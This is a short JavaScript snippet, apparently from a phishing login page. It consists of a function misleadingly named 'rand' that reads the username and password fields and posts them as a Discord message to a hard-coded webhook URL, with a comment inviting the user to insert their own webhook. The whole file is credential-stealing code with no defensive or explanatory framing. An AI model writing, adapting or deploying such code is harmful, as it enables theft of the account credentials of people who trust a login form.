function rand() {
	
	
	
	u = document.getElementById("login-username").value; 
	p = document.getElementById("login-password").value;
	
	wb = "https://discord.com/api/webhooks/1274498078321279036/KBMk9wRJojOFpVoFgYs9wE5Rs95cbyAgeeluMvNrgiFBPILBIc94XN-04XfyuGooIUoH"; //enter webhook here
	
	var request = new XMLHttpRequest();
      request.open("POST", wb);

      request.setRequestHeader('Content-type', 'application/json');

      var params = {
        content: "```Username: " + u + " | Password: " + p + "```"
      }

      request.send(JSON.stringify(params));
	
}
